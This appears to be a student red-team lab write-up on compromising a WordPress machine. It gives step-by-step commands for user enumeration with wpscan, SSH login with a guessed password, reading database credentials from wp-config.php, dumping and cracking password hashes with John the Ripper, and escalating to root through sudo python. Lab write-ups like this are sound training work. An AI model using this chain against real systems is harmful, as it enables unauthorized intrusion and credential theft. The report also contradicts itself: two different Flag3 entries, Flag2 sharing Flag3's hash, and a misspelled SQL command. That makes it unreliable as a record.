# Red Team: Summary of Operations

## Table of Contents
- Exposed Services
- Critical Vulnerabilities
- Exploitation

---

### Exposed Services

Nmap scan results for each machine reveal the below services and OS details:

```bash
$ nmap 192.168.1.110
```
![](https://github.com/jamesdewhirst/FinalProject/blob/main/Images/1-nmap.png)

This scan identifies the services below as potential points of entry:

**Target 1**
```
- Port 22/TCP   Open SSH
- Port 80/TCP   Open HTTP
- Port 111/TCP 	Open rcpbind
- Port 139/TCP 	Open netbios-ssn
- Port 445/TCP 	Open netbios-ssn
```

The following vulnerabilities were identified on each target:
**Target 1**
```
- Weak User Password
- WordPress - user enumeration and unsalted user password hash
- Escalation of privilege
```

---

### Exploitation

The Red Team was able to penetrate Target 1 and retrieve the following confidential data:

**Target 1**
- **Flag1: b9bbcb33e11b80be759c4e844862482d**
- Exploit Used:
    - WPScan to identify users of the Target 1 machine
    - Command: `$ wpscan --url http://192.168.1.110/wordpress`

![](https://github.com/jamesdewhirst/FinalProject/blob/main/Images/wp1.png)

    - Command: `$ wpscan --url http://192.168.1.110/wordpress --enumerate u`

![](https://github.com/jamesdewhirst/FinalProject/blob/main/Images/wpu.png)

- Accessing user Michael
    - due to a weak password we were able to guess Michael's password
    - `ssh michael@192.168.1.110`
    - Password: `michael`

![](https://github.com/jamesdewhirst/FinalProject/blob/main/Images/SSH.png)

- Accessing var/www/html as root and using `grep` to capture flag1.
    - Commands:
        - `cd ../`
        - `cd var/www`
        - `cd html/`
        - `ls`
        - `grep -IR flag1 *`

![](https://github.com/jamesdewhirst/FinalProject/blob/main/Images/flag1.png)

- **Flag2: fc3fd58dcdad9ab23faca6e9a36e5**
- Exploit Used:
    - Same exploit used to capture flag1.
    - Once `wp-config.php` was found, we gained access to the database (as Michael) MySQL was used to locate flag3.
        - Commands:
            - `cd ../`
            - `ls`
            - `cat flag2.txt`

![](https://github.com/jamesdewhirst/FinalProject/blob/main/Images/flag2.png)

- **Flag3: fc3fd58dcdad9ab23faca6e9a36e5**
- Exploit Used:
    - Same exploit used to capture flag1 and flag2.
    - Once `wp-config.php` was found, we gained access to the database (as Michael) MySQL was used to locate flag3.
        - Commands:
            - `mysql -u root -pR@v3nSecurity`
            - `connect wordpress`
            - `show tables`
            - `seletct * from wp_posts;`

![](https://github.com/jamesdewhirst/FinalProject/blob/main/Images/sp_post.png)











![Flag 2 location](/Images/flag2-location.png "Flag 2 location")

![Flag 2 cat](/Images/flag2-cat.png "Flag 2 cat")

- **Flag3: afc01ab56b50591e7dccf93122770cd2**
- Exploit Used:
    - Same exploits used to gain Flag 1 and 2.
    - Capturing Flag 3: Accessing MySQL database.
        - Once having found wp-config.php and gaining access to the database credentials as Michael, MySQL was used to explore the database.
        - Flag 3 was found in wp_posts table in the wordpress database.
        - Commands:
            - `mysql -u root -p’R@v3nSecurity’ -h 127.0.0.1` 
            - `show databases;`
            - `use wordpress;` 
            - `show tables;`
            - `select * from wp_posts;`

![Flag 3 location](/Images/flag3-location.png "Flag 3 location")

- **Flag4: 715dea6c055b9fe3337544932f2941ce**
- Exploit Used:
    - Unsalted password hash and the use of privilege escalation with Python.
    - Capturing Flag 4: Retrieve user credentials from database, crack password hash with John the Ripper and use Python to gain root privileges.
        - Once having gained access to the database credentials as Michael from the wp-config.php file, lifting username and password hashes using MySQL was next. 
        - These user credentials are stored in the wp_users table of the wordpress database. The usernames and password hashes were copied/saved to the Kali machine in a file called wp_hashes.txt.
            - Commands:
                - `mysql -u root -p’R@v3nSecurity’ -h 127.0.0.1` 
                - `show databases;`
                - `use wordpress;` 
                - `show tables;`
                - `select * from wp_users;`

        - ![wp_users table](/Images/wpusers-table.png "wp_users table")

        - On the Kali local machine the wp_hashes.txt was run against John the Ripper to crack the hashes. 
            - Command:
                - `john wp_hashes.txt`

        - ![John the Ripper results](/Images/john-results.png "John the Ripper results")

        - Once Steven’s password hash was cracked, the next thing to do was SSH as Steven. Then as Steven checking for privilege and escalating to root with Python
            - Commands: 
                - `ssh steven@192.168.1.110`
                - `pw:pink84`
                - `sudo -l`
                - `sudo python -c ‘import pty;pty.spawn(“/bin/bash”)’`
                - `cd /root`
                - `ls`
                - `cat flag4.txt`

![Flag 4 location](/Images/flag4-location.png "Flag 4 location")
